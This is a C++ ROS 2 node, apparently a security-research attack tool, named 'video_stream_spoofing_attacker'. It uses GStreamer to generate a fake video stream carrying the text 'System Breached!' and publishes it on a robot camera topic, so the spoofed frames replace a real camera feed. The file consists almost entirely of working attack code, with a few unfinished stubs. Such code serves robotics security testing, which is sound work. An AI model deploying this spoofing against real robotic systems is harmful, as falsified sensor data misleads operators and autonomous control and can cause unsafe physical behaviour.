#include <memory>
#include <thread>
#include <iostream>
#include <chrono>
#include <stdlib.h>
#include <algorithm>
#include <string>
#include <cctype>
#include <arpa/inet.h>


#include <gst/gst.h>
#include <gst/gstbus.h>
#include <gst/gstpipeline.h>
#include <gst/gstelement.h>
#include <gst/gstcaps.h>
#include <gst/app/gstappsink.h>

#include <nlohmann/json.hpp>


#include "rclcpp/rclcpp.hpp"
#include "rcl_interfaces/msg/parameter_descriptor.hpp"
#include <sensor_msgs/msg/compressed_image.hpp>
#include <sensor_msgs/msg/image.hpp>

using std::placeholders::_1;

using namespace std::chrono_literals;

class VideoSpoofingNode : public rclcpp::Node
{
public:
  VideoSpoofingNode()
  : Node("video_stream_spoofing_attacker"),
    pipeline_(nullptr), sink_(nullptr), source_(nullptr),
    loop_(nullptr), bus_(nullptr)
  {
    publisher_ = this->create_publisher<sensor_msgs::msg::CompressedImage>(
      "/performancetest1/camera/color/video",
      rclcpp::SensorDataQoS());
    publisher_image_ = this->create_publisher<sensor_msgs::msg::Image>(
      "/image_stream",
      rclcpp::SensorDataQoS());
    on_set_parameter_cb_handle_ =
      this->add_on_set_parameters_callback(
      std::bind(
        &VideoSpoofingNode::on_set_parameter_cb, this,
        _1));

    gst_init(nullptr, nullptr);
    initializeGst();

  }

  virtual ~VideoSpoofingNode() = default;
  void killCameraNode()
  {
    RCLCPP_INFO(this->get_logger(), "Killing camera node");
  }

private:
  bool initializeGst()
  {
    RCLCPP_INFO(this->get_logger(), "Initializing Gst");
    GError * err = NULL;


    const std::string gst_launch =
      "videotestsrc pattern=smpte is-live=true ! video/x-raw,format=I420,width=1280,height=720,framerate=25/1 \
                ! textoverlay text=\"System Breached!\" valignment=4 halignment=1 font-desc=Sans \
                ! videoconvert ! x264enc ! video/x-h264, stream-format=byte-stream,profile=main \
                ! queue ! appsink name=mysink \
                ";

/*
    const std::string gst_launch =
      "videotestsrc pattern=circular ! video/x-raw,format=I420,width=1280,height=720,framerate=25/1 \
                ! textoverlay text=\"Camera not detected\" valignment=4 halignment=1 font-desc=Sans \
                ! videoconvert ! x264enc ! video/x-h264, stream-format=byte-stream,pass=5,profile=main,trellis=false,\
                tune=zerolatency,threads=0,speed-preset=superfast,subme=1,bitrate=4000   \
                ! queue ! appsink name=mysink \
                ";*/
    //const std::string gst_launch = "videotestsrc pattern=ball ! video/x-raw,width=1920,height=1080,format=RGB ! \
    //  videorate ! video/x-raw, framerate=30/1  ! appsink name=mysink";

    pipeline_ = gst_parse_launch(gst_launch.c_str(), &err);

    if (err != NULL) {
      RCLCPP_ERROR(this->get_logger(), "failed to create pipeline : (%s)", err->message);
      g_error_free(err);
      return false;
    }

    GstPipeline * pipeline = GST_PIPELINE(pipeline_);

    bus_ = gst_pipeline_get_bus(pipeline);

    if (!bus_)
    {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve GstBus from pipeline");
      return false;
    }

    // Get the appsrc
    GstElement * appsinkElement = gst_bin_get_by_name(GST_BIN(pipeline), "mysink");
    GstAppSink * appsink = GST_APP_SINK(appsinkElement);

    if (!appsink) {
      RCLCPP_ERROR(this->get_logger(), "failed to retrieve AppSink element from pipeline");
      return false;
    }

    sink_ = appsink;

    GstAppSinkCallbacks cb;
    memset(&cb, 0, sizeof(GstAppSinkCallbacks));

    cb.eos = on_eos;
    cb.new_preroll = on_preroll;
    cb.new_sample = on_buffer;

    gst_app_sink_set_callbacks(sink_, &cb, (void *)this, NULL);

    const GstStateChangeReturn result = gst_element_set_state(pipeline_, GST_STATE_PLAYING);

    if (result == GST_STATE_CHANGE_ASYNC) {
      // here will be a debug point in the future
      RCLCPP_INFO(get_logger(), "success to set pipeline state to PLAYING");
    } else if (result != GST_STATE_CHANGE_SUCCESS) {
      RCLCPP_ERROR(get_logger(), "failed to set pipeline state to PLAYING (error %u)", result);
      return false;
    }
  }
  static void on_eos(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;

    RCLCPP_INFO(node->get_logger(), "on_eos called");
  }

  static GstFlowReturn on_preroll(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;

    RCLCPP_INFO(node->get_logger(), "on_preroll called");
    return GST_FLOW_OK;
  }

  static GstFlowReturn on_buffer(_GstAppSink * sink, void * user_data)
  {
    VideoSpoofingNode * node = (VideoSpoofingNode *)user_data;
    GstSample * sample;

    //RCLCPP_INFO(node->get_logger(), "on_buffer called");

    // Retrieve the buffer
    g_signal_emit_by_name(sink, "pull-sample", &sample);

    if (sample) {
      GstMapInfo info;
      GstBuffer * buffer = gst_sample_get_buffer(sample);

      gst_buffer_map(buffer, &info, GST_MAP_READ);

      if (info.data != NULL) {
        int width, height;
        GstStructure * str;

        GstCaps * caps = gst_sample_get_caps(sample);
        // Get a string containg the pixel format, width and height of the image
        str = gst_caps_get_structure(caps, 0);

        gst_structure_get_int(str, "width", &width);
        gst_structure_get_int(str, "height", &height);
        
        // ### publish
        auto img = std::make_unique<sensor_msgs::msg::Image>();
        GstClockTime stamp = buffer->pts;
        auto video_stream_chunk = std::make_unique<sensor_msgs::msg::CompressedImage>();
        video_stream_chunk->header.frame_id = "color_camera_frame";
        video_stream_chunk->header.stamp = rclcpp::Time(stamp, RCL_STEADY_TIME);
        
        // Get data from the info, and copy it to the chunk 
        video_stream_chunk->data.resize(info.size);
        memcpy(video_stream_chunk->data.data(), info.data, info.size);


        //auto frame = (unsigned char*)info.data;

        /*std::copy(
          info.data,
          info.data + info.size,
          video_stream_chunk->data.begin()
        );*/
        //video_stream_chunk.data.swap(info.data);
        /*
        img->width            = width;
        img->height           = height;

        img->encoding         = "rgb8";
        img->is_bigendian     = false;
        img->data.resize(width * height * 3);

        img->step             = width * 3;

        // Copy the image so we can free the buffer allocated by gstreamer
        std::copy(
          info.data,
          info.data + info.size,
          img->data.begin()
        );
        img->header.frame_id = "camera";*/
        static int count = 0;
        RCLCPP_INFO(
          node->get_logger(),
          "[#%4d], size %d,", 
          count++, info.size );

        node->publisher_->publish(std::move(video_stream_chunk));
        gst_buffer_unmap(buffer, &info);
      }
      gst_sample_unref(sample);

      return GST_FLOW_OK;
    }

    return GST_FLOW_ERROR;
  }

  rcl_interfaces::msg::SetParametersResult
  on_set_parameter_cb(const std::vector<rclcpp::Parameter> & parameters)
  {

    rcl_interfaces::msg::SetParametersResult result;
    result.successful = true;
    for (const rclcpp::Parameter & parameter : parameters) {
      result.successful = false;
      result.reason = "the reason it could not be allowed";
      RCLCPP_INFO(this->get_logger(), "parameter: %s", parameter.get_name().c_str());
      RCLCPP_INFO(this->get_logger(), "value: %s", parameter);
    }
    return result;
  }
  //uint8_t data_;

  rclcpp::Publisher<sensor_msgs::msg::CompressedImage>::SharedPtr publisher_;
  rclcpp::Publisher<sensor_msgs::msg::Image>::SharedPtr publisher_image_;
  std::string gst_pipeline_string_;
  OnSetParametersCallbackHandle::SharedPtr on_set_parameter_cb_handle_;

  GstElement * pipeline_;
  GstElement * source_;
  GstAppSink * sink_;
  GstBus*      bus_;
  GMainLoop * loop_;

};

int main(int argc, char * argv[])
{
  rclcpp::init(argc, argv);
  rclcpp::executors::MultiThreadedExecutor executor;

  auto gst_node = std::make_shared<VideoSpoofingNode>();

  executor.add_node(gst_node);

  executor.spin();

  rclcpp::shutdown();
  return 0;
}
